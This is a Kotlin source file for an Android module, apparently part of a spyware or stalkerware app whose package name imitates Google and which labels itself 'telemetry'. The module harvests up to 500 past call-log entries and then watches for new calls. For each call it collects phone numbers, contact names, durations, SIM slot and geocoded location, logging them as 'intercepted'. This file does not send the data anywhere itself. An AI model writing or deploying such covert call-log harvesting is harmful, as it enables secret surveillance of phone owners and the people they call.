package com.opp.googleoperation.telemetry

import android.content.Context
import android.database.ContentObserver
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.CallLog
import android.util.Log
import com.opp.googleoperation.data.model.CallEvent
import com.opp.googleoperation.util.Constants
import com.opp.googleoperation.util.PermissionHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.flow.asSharedFlow
import kotlinx.coroutines.launch
import java.util.UUID

class CallLogObserver(
    private val ctx: Context,
    private val scope: CoroutineScope
) {
    companion object {
        private const val TAG = "CallLogObserver"
        private const val KEY_INITIAL_CALL_LOGS_SYNCED_V4 = "key_initial_call_logs_synced_v4"
        private const val KEY_LAST_CALL_LOG_TIMESTAMP = "key_last_call_log_timestamp"
        private val _callLogEvents = MutableSharedFlow<CallEvent>(extraBufferCapacity = 1000)
        val callLogEvents: SharedFlow<CallEvent> = _callLogEvents.asSharedFlow()
    }

    private val prefs = ctx.getSharedPreferences(Constants.PREFS_NAME, Context.MODE_PRIVATE)
    private val handler = Handler(Looper.getMainLooper())
    private var isRegistered = false
    private var pendingInspectRunnable: Runnable? = null

    private val observer = object : ContentObserver(handler) {
        override fun onChange(selfChange: Boolean, uri: Uri?) {
            super.onChange(selfChange, uri)
            pendingInspectRunnable?.let { handler.removeCallbacks(it) }
            val runnable = Runnable { inspectNewCallLogs() }
            pendingInspectRunnable = runnable
            handler.postDelayed(runnable, 600)
        }
    }

    fun startObserving() {
        if (isRegistered) return
        if (!PermissionHelper.hasCallLogPermission(ctx)) {
            Log.w(TAG, "READ_CALL_LOG permission missing")
            return
        }

        syncInitialHistoricalCallLogsIfFirstTime()

        try {
            ctx.contentResolver.registerContentObserver(
                CallLog.Calls.CONTENT_URI,
                true,
                observer
            )
            isRegistered = true
            Log.d(TAG, "CallLog content observer registered")
        } catch (e: Exception) {
            Log.w(TAG, "failed to register CallLog observer", e)
        }
    }

    fun stopObserving() {
        if (!isRegistered) return
        try {
            pendingInspectRunnable?.let { handler.removeCallbacks(it) }
            ctx.contentResolver.unregisterContentObserver(observer)
            isRegistered = false
            Log.d(TAG, "CallLog content observer unregistered")
        } catch (e: Exception) {
            Log.w(TAG, "failed to unregister CallLog observer", e)
        }
    }

    fun forceResyncAllCallLogs() {
        prefs.edit().putBoolean(KEY_INITIAL_CALL_LOGS_SYNCED_V4, false).apply()
        syncInitialHistoricalCallLogsIfFirstTime()
    }

    private fun syncInitialHistoricalCallLogsIfFirstTime() {
        val alreadySynced = prefs.getBoolean(KEY_INITIAL_CALL_LOGS_SYNCED_V4, false)
        if (alreadySynced) return

        scope.launch(Dispatchers.IO) {
            if (!PermissionHelper.hasCallLogPermission(ctx)) return@launch
            Log.d(TAG, "starting full chronological sync of recent call history (newest first)")

            val projection = mutableListOf(
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            )

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                projection.add(CallLog.Calls.PHONE_ACCOUNT_ID)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                projection.add(CallLog.Calls.GEOCODED_LOCATION)
            }

            var cursor: Cursor? = null
            var count = 0
            var maxTimestamp = 0L

            try {
                // Query phone calls ordered by newest first
                cursor = ctx.contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    projection.toTypedArray(),
                    null,
                    null,
                    "${CallLog.Calls.DATE} DESC"
                )

                if (cursor != null) {
                    val numberCol = cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
                    val nameCol = cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)
                    val typeCol = cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)
                    val dateCol = cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)
                    val durationCol = cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)
                    val devId = PermissionHelper.getOrCreateDeviceId(ctx)

                    while (cursor.moveToNext() && count < 500) {
                        val dateMs = cursor.getLong(dateCol)
                        if (dateMs > maxTimestamp) {
                            maxTimestamp = dateMs
                        }

                        val number = cursor.getString(numberCol) ?: "Unknown"
                        val cachedName = cursor.getString(nameCol)
                        val typeInt = cursor.getInt(typeCol)
                        val durationSec = cursor.getLong(durationCol)

                        val callTypeStr = when (typeInt) {
                            CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                            CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                            CallLog.Calls.MISSED_TYPE -> "MISSED"
                            CallLog.Calls.VOICEMAIL_TYPE -> "VOICEMAIL"
                            CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                            CallLog.Calls.BLOCKED_TYPE -> "BLOCKED"
                            else -> "UNKNOWN"
                        }

                        var simSlot = 1
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                            val accountCol = cursor.getColumnIndex(CallLog.Calls.PHONE_ACCOUNT_ID)
                            if (accountCol >= 0) {
                                val accountId = cursor.getString(accountCol)
                                if (accountId != null && accountId.contains("1")) {
                                    simSlot = 2
                                }
                            }
                        }

                        var geocodedLoc: String? = null
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                            val locCol = cursor.getColumnIndex(CallLog.Calls.GEOCODED_LOCATION)
                            if (locCol >= 0) {
                                geocodedLoc = cursor.getString(locCol)
                            }
                        }

                        val event = CallEvent(
                            id = UUID.randomUUID().toString(),
                            deviceId = devId,
                            phoneNumber = number,
                            contactName = cachedName,
                            callType = callTypeStr,
                            durationSeconds = durationSec,
                            simSlot = simSlot,
                            geocodedLocation = geocodedLoc,
                            callTimestamp = dateMs,
                            callState = "COMPLETED"
                        )

                        _callLogEvents.tryEmit(event)
                        count++
                    }

                    if (maxTimestamp == 0L) {
                        maxTimestamp = System.currentTimeMillis()
                    }

                    prefs.edit()
                        .putBoolean(KEY_INITIAL_CALL_LOGS_SYNCED_V4, true)
                        .putLong(KEY_LAST_CALL_LOG_TIMESTAMP, maxTimestamp)
                        .apply()

                    Log.d(TAG, "full call history sync completed: queued $count calls, latest timestamp: $maxTimestamp")
                }
            } catch (e: Exception) {
                Log.w(TAG, "error during call history sync", e)
            } finally {
                cursor?.close()
            }
        }
    }

    private fun inspectNewCallLogs() {
        scope.launch(Dispatchers.IO) {
            if (!PermissionHelper.hasCallLogPermission(ctx)) return@launch

            val lastProcessedDate = prefs.getLong(KEY_LAST_CALL_LOG_TIMESTAMP, System.currentTimeMillis() - 60000)

            val projection = mutableListOf(
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            )

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                projection.add(CallLog.Calls.PHONE_ACCOUNT_ID)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                projection.add(CallLog.Calls.GEOCODED_LOCATION)
            }

            var cursor: Cursor? = null
            try {
                // Strictly query new calls with DATE > lastProcessedDate
                cursor = ctx.contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    projection.toTypedArray(),
                    "${CallLog.Calls.DATE} > ?",
                    arrayOf(lastProcessedDate.toString()),
                    "${CallLog.Calls.DATE} ASC"
                )

                if (cursor != null && cursor.count > 0) {
                    val numberCol = cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
                    val nameCol = cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)
                    val typeCol = cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)
                    val dateCol = cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)
                    val durationCol = cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)
                    val devId = PermissionHelper.getOrCreateDeviceId(ctx)

                    var latestTimestamp = lastProcessedDate

                    while (cursor.moveToNext()) {
                        val dateMs = cursor.getLong(dateCol)
                        if (dateMs > latestTimestamp) {
                            latestTimestamp = dateMs
                        }

                        val number = cursor.getString(numberCol) ?: "Unknown"
                        val cachedName = cursor.getString(nameCol)
                        val typeInt = cursor.getInt(typeCol)
                        val durationSec = cursor.getLong(durationCol)

                        val callTypeStr = when (typeInt) {
                            CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                            CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                            CallLog.Calls.MISSED_TYPE -> "MISSED"
                            CallLog.Calls.VOICEMAIL_TYPE -> "VOICEMAIL"
                            CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                            CallLog.Calls.BLOCKED_TYPE -> "BLOCKED"
                            else -> "UNKNOWN"
                        }

                        var simSlot = 1
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                            val accountCol = cursor.getColumnIndex(CallLog.Calls.PHONE_ACCOUNT_ID)
                            if (accountCol >= 0) {
                                val accountId = cursor.getString(accountCol)
                                if (accountId != null && accountId.contains("1")) {
                                    simSlot = 2
                                }
                            }
                        }

                        var geocodedLoc: String? = null
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                            val locCol = cursor.getColumnIndex(CallLog.Calls.GEOCODED_LOCATION)
                            if (locCol >= 0) {
                                geocodedLoc = cursor.getString(locCol)
                            }
                        }

                        val callEvent = CallEvent(
                            id = UUID.randomUUID().toString(),
                            deviceId = devId,
                            phoneNumber = number,
                            contactName = cachedName,
                            callType = callTypeStr,
                            durationSeconds = durationSec,
                            simSlot = simSlot,
                            geocodedLocation = geocodedLoc,
                            callTimestamp = dateMs,
                            callState = "COMPLETED"
                        )

                        Log.d(TAG, "intercepted verified new call: [$callTypeStr] $number ($cachedName) ${durationSec}s")
                        _callLogEvents.tryEmit(callEvent)
                    }

                    prefs.edit().putLong(KEY_LAST_CALL_LOG_TIMESTAMP, latestTimestamp).apply()
                }
            } catch (e: Exception) {
                Log.w(TAG, "error querying new CallLog entries", e)
            } finally {
                cursor?.close()
            }
        }
    }
}
